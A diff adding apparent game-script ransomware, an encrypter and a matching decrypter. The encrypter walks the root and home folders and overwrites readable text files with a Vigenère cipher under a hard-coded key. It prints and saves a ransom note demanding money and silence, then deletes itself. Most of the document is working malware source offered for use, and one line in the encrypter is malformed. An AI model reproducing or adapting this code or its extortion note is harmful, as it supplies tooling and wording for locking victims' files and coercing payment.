@@ -1,0 +1,159 @@
+//RANSOMWARE ENCRYPTER
+//encrypter
+
+host = get_shell.host_computer
+user = active_user
+encrypter = host.File(program_path)
+rootdir = host.File("/")
+homedir = host.File(home_dir)
+rootfolders = rootdir.get_folders
+homefolders = homedir.get_folders
+files = rootdir.get_files
+host.touch(home_dir,"ReadMe.txt")
+readme = host.File(home_dir+"/"+"ReadMe.txt")
+rootdir.chmod("u+rwx", 1)
+homedir.chmod("u+rwx", 1)
+
+encrypt = function(msg,pass,mode)
+	LETTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+	LETTERSL = "abcdefghijklmnopqrstuvwxyz"
+	
+	translated = []
+	keyIndex = 0
+	key = pass.upper
+	
+	for symbol in msg
+		num = LETTERS.indexOf(symbol.upper)
+		if num != null then
+			if mode == "encrypt" or mode == "Encrypt" or mode == "e" then
+				num = num + LETTERS.indexOf(key[keyIndex])
+			else if mode == with "decrypt" or mode == "Decrypt" or mode == "d" then
+				num = num - LETTERS.indexOf(key[keyIndex])
+			else 
+				exit("Mode not established.")
+			end if
+			num = num % LETTERS.len
+			
+			if LETTERS.indexOf(symbol) != null then
+				translated.push(LETTERS[num])
+			else if LETTERSL.indexOf(symbol) != null then
+				translated.push(LETTERSL[num])
+			end if
+			
+			keyIndex = keyIndex + 1
+			
+			if keyIndex == key.len then 
+				keyIndex = 0
+			end if
+		else 
+			translated.push(symbol)
+		end if
+	end for
+	
+	return translated.join("")
+end function
+
+
+for folder in rootfolders
+	files = files + folder.get_files
+end for
+
+for folder in homefolders
+	files = files + folder.get_files
+end for
+
+for file in files
+	if file.is_binary then continue
+	if file.has_permission("r") and file.has_permission("w") then
+		cont = file.content
+		if cont then file.set_content(encrypt(cont,"theruskie","e"))
+	end if
+end for
+
+print("<color=red>Your important files are no longer accesible.")
+print("<color=green>Do not waste your time looking for a way to recover your files.")
+print("<color=green>Nobody except I can recover your personal data.")
+print("<color=green>Ask in the general chat to get the decrypter. Maybe if you are lucky enough aka I like you and you have money.")
+print("<color=green>Then I will send a decrypter to your personal e-mail address.")
+print("<color=green>Oh, and don't tell anyone or you won't ever see the decrypter.")
+print("<color=green>Regards.")
+
+readme.set_content("Your important files are no longer accesible.\nDo not waste your time looking for a way to recover your files.\nNobody except I can recover your personal data.\nAsk in the general chat to get the decrypter. Maybe if you are lucky aka I like you and you have money.\nThen I will send a decrypter to your personal e-mail address.\nOh, and don't tell anyone or you won't ever see the decrypter.\nRegards.")
+
+encrypter.delete
+
+
+
+//RANSOMWARE DECRYPTER 
+host = get_shell.host_computer
+user = active_user
+decrypter = host.File(program_path)
+rootdir = host.File("/")
+homedir = host.File(home_dir)
+rootfolders = rootdir.get_folders
+homefolders = homedir.get_folders
+files = rootdir.get_files
+host.touch(home_dir,"ReadMe.txt")
+readme = host.File(home_dir+"/"+"ReadMe.txt")
+
+encrypt = function(msg,pass,mode)
+	LETTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+	LETTERSL = "abcdefghijklmnopqrstuvwxyz"
+	
+	translated = []
+	keyIndex = 0
+	key = pass.upper
+	
+	for symbol in msg
+		num = LETTERS.indexOf(symbol.upper)
+		if num != null then
+			if mode == "encrypt" or mode == "Encrypt" or mode == "e" then
+				num = num + LETTERS.indexOf(key[keyIndex])
+			else if mode == "decrypt" or mode == "Decrypt" or mode == "d" then
+				num = num - LETTERS.indexOf(key[keyIndex])
+			else 
+				exit("Mode not established.")
+			end if
+			num = num % LETTERS.len
+			
+			if LETTERS.indexOf(symbol) != null then
+				translated.push(LETTERS[num])
+			else if LETTERSL.indexOf(symbol) != null then
+				translated.push(LETTERSL[num])
+			end if
+			
+			keyIndex = keyIndex + 1
+			
+			if keyIndex == key.len then 
+				keyIndex = 0
+			end if
+		else 
+			translated.push(symbol)
+		end if
+	end for
+	
+	return translated.join("")
+end function
+
+
+for folder in rootfolders
+	files = files + folder.get_files
+end for
+
+for folder in homefolders
+	files = files + folder.get_files
+end for
+
+for file in files
+	if file.is_binary then continue
+	if file.has_permission("r") and file.has_permission("w") then
+		cont = file.content
+		if cont then file.set_content(encrypt(cont,"theruskie","d"))
+	end if
+end for
+
+print("<color=red>Congrats, your files are accesible once again.")
+
+readme.set_content("Congrats, your files are accesible once again.\nDo not tell the FBI.")
+
+decrypter.delete
